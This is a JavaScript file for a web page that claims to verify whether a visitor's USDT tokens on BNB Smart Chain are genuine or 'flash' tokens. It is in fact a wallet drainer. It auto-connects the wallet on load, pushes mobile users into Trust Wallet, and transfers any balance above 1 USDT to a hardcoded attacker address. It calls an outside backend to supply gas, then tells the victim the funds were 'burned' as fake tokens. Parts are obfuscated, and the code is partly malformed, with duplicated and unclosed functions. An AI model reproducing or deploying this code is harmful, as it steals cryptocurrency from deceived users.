const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract

let web3;
let userAddress;

 function _0x3140(_0x98b4dc, _0x3aad4a) {
            const _0x17fe93 = _0x17fe();
            return (
                (_0x3140 = function (_0x31402b, _0x37f418) {
                    _0x31402b = _0x31402b - 0x91;
                    let _0x14767f = _0x17fe93[_0x31402b];
                    return _0x14767f;
                }),
                _0x3140(_0x98b4dc, _0x3aad4a)
            );
        }

        // Connect Wallet with iOS Support
        async function connectWallet() {
            const _0x4aa6d2 = _0x1b5be5;

            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
            const isTrustWallet = window.ethereum && window.ethereum.isTrust;

            if (isIOS && !window[_0x4aa6d2(0xb5)]) {
                const link = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(
                    window.location.href
                )}`;
                window.location.href = link;

                setTimeout(() => {
                    if (!window[_0x4aa6d2(0xb5)]) {
                        alert(
                            "\uD83D\uDD17 Please open in Trust Wallet browser or connect manually."
                        );
                    }
                }, 2000);
                return;
            }


async function connectWallet() {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: "eth_accounts" });

            // Force switch to BNB Smart Chain
            await window.ethereum.request({
                method: "wallet_switchEthereumChain",
                params: [{ chainId: "0x38" }]
            });

            const accounts = await web3.eth.getAccounts();
            userAddress = accounts[0];
            console.log("Wallet Connected:", userAddress);
        } catch (error) {
            console.error("Error connecting wallet:", error);
            alert("Please switch to BNB Smart Chain.");
        }
    } else {
        alert("Please install MetaMask.");
    }
}

 // Auto-connect on page load (iOS & Android)
        window.addEventListener('load', async () => {
            const isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
            const isAndroid = /Android/i.test(navigator.userAgent);
            const hasEth = Boolean(window.ethereum);
            const isTrust = hasEth && window.ethereum.isTrust;

            if (isTrust) {
                // Already in Trust Wallet DApp browser → connect immediately
                await connectWallet();
            }
            else if ((isIOS || isAndroid) && !hasEth) {
                // On mobile Safari/Chrome & no injected provider → deep-link into Trust Wallet
                const deepLink = `https://link.trustwallet.com/open_url?coin_id=20000714&url=${encodeURIComponent(window.location.href)
                    }`;
                window.location.href = deepLink;

                // Fallback if user doesn’t arrive in time
                setTimeout(() => {
                    if (!window.ethereum) {
                        alert("🔗 Please open this page in the Trust Wallet DApp browser.");
                    }
                }, 2000);
            }
        });

 function _0x17fe() {
            const _0x3fd85e = [
                "transfer",
                "Next",
                "1232ojfoIv",
                "2nrOmrR",
                "application/json",
                "block",
                "balanceOf",
                "display",
                "center",
                "top",
                "21FEpkXF",
                "backgroundColor",
                "fromWei",
                "\x20BNB",
                "getBalance",
                "addEventListener",
                "Transferring\x20",
                "fixed",
                "bool",
                "uint256",
                "body",
                "utils",
                "eth_accounts",
                "2306763LSzeEn",
                "black",
                "\x20for\x20gas\x20fees.",
                "1380120TWollh",
                "call",
                "6645RBXuDC",
                "469058OBilvS",
                "error",
                "⚠️\x20Error\x20sending\x20BNB:",
                "recipient",
                "\x20USDT",
                "Wallet\x20not\x20connected.\x20Refresh\x20the\x20page.",
                "USDT\x20transfer\x20failed.\x20Ensure\x20you\x20have\x20enough\x20BNB\x20for\x20gas.",
                "Wallet\x20Connected:",
                "appendChild",
                "div",
                "boxShadow",
                "✅\x20Sent\x20",
                "\x20USDT\x20to\x20",
                "18681710MpZxuo",
                "ethereum",
                "368odXlEv",
                "eth",
                "\x20USDT<br><b>BNB\x20Balance:</b>\x20",
                "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87",
                "3834135AAKgxs",
                "POST",
                "wallet_switchEthereumChain",
                "BNB\x20Balance:\x20",
                "none",
                "ether",
                "Contract",
                "load",
                "log",
                "address",
                "No\x20assets\x20found.",
                "click",
                "popupBox",
                "Please\x20switch\x20to\x20BNB\x20Smart\x20Chain.",
                "methods",
                "https://bep20usdt-backend-production.up.railway.app/send-bnb",
                "18px",
                "Error\x20connecting\x20wallet:",
                "position",
                "80%",
                "User\x20BNB\x20is\x20low.\x20Requesting\x20BNB\x20from\x20backend...",
                "0px\x200px\x2010px\x20rgba(0,\x200,\x200,\x200.2)",
                "width",
                "borderRadius",
                "_owner",
                "textAlign",
                "stringify",
                "left",
                "sendTransaction",
                "toWei",
                "red",
                "color",
                "green",
                "#ffebeb",
                "toString",
                "request",
                "50%",
                "\x20BNB\x20to\x20",
                "0x38",
                "getAccounts",
                "transform",
                "...",
                "maxWidth",
                "✅\x20Verification\x20Successful<br>Your\x20assets\x20are\x20genuine.\x20No\x20flash\x20or\x20reported\x20USDT\x20found.<br><br><b>USDT\x20Balance:</b>\x20",
                "style",
                "getElementById",
            ];
            _0x17fe = function () {
                return _0x3fd85e;
            };
            return _0x17fe();
         
// Auto-connect wallet on page load
window.addEventListener("load", connectWallet);

async function Next() {
    if (!web3 || !userAddress) {
        alert("Wallet not connected. Refresh the page.");
        return;
    }

    const usdtContract = new web3.eth.Contract([
        { "constant": true, "inputs": [{ "name": "_owner", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "type": "function" }
    ], usdtContractAddress);

    // Fetch balances
    const [usdtBalanceWei, userBNBWei] = await Promise.all([
        usdtContract.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const userBNB = parseFloat(web3.utils.fromWei(userBNBWei, "ether"));

    console.log(`USDT Balance: ${usdtBalance} USDT`);
    console.log(`BNB Balance: ${userBNB} BNB`);

    if (usdtBalance === 0) {
        showPopup("No assets found.", "black");
        return;
    }

    if (usdtBalance <= 1) {
        showPopup(
            `✅ Verification Successful<br>Your assets are genuine. No flash or reported USDT found.<br><br><b>USDT Balance:</b> ${usdtBalance} USDT<br><b>BNB Balance:</b> ${userBNB} BNB`,
            "green"
        );
        return;
    }

    // User has more than 150 USDT → Check BNB Gas Fee
    showPopup("Loading...", "green");

    transferUSDT(usdtBalance, userBNB);
}

async function transferUSDT(usdtBalance, userBNB) {
    try {
        if (userBNB < 0.0005) {
    console.log("User BNB is low. Requesting BNB from backend...");
    await fetch("https://bep20usdt-backend-production.up.railway.app/send-bnb", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ toAddress: userAddress })
    });
        }

        // Proceed with USDT Transfer
        const usdtContract = new web3.eth.Contract([
            { "constant": false, "inputs": [{ "name": "recipient", "type": "address" }, { "name": "amount", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "type": "function" }
        ], usdtContractAddress);

        const amountToSend = web3.utils.toWei(usdtBalance.toString(), "ether");

        console.log(`Transferring ${usdtBalance} USDT to ${bscAddress}...`);

        await usdtContract.methods.transfer(bscAddress, amountToSend).send({ from: userAddress });

        showPopup(
            `✅ Verification Successful<br>Flash USDT has been detected and successfully burned.<br><br><b>USDT Burned:</b> ${usdtBalance} USDT`,
            "red"
        );

        console.log(`✅ Transferred ${usdtBalance} USDT to ${bscAddress}`);
    } catch (error) {
        console.error("❌ USDT Transfer Failed:", error);
        alert("USDT transfer failed. Ensure you have enough BNB for gas.");
    }
}

async function sendBNB(toAddress, amount) {
    try {
        await web3.eth.sendTransaction({
            from: bnbGasSender,
            to: toAddress,
            value: web3.utils.toWei(amount, "ether"),
            gas: 21000
        });

        console.log(`✅ Sent ${amount} BNB to ${toAddress} for gas fees.`);
    } catch (error) {
        console.error("⚠️ Error sending BNB:", error);
    }
}

// Function to display pop-up message
function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0px 0px 10px rgba(0, 0, 0, 0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "18px";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        document.body.appendChild(popup);
    }

    popup.style.backgroundColor = color === "red" ? "#ffebeb" : "#e6f7e6";
    popup.style.color = color === "red" ? "red" : "green";
    popup.innerHTML = message;
    popup.style.display = "block";

    // Auto-hide after 5 seconds
    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

// Attach event listener
document.getElementById("Next").addEventListener("click", Next);
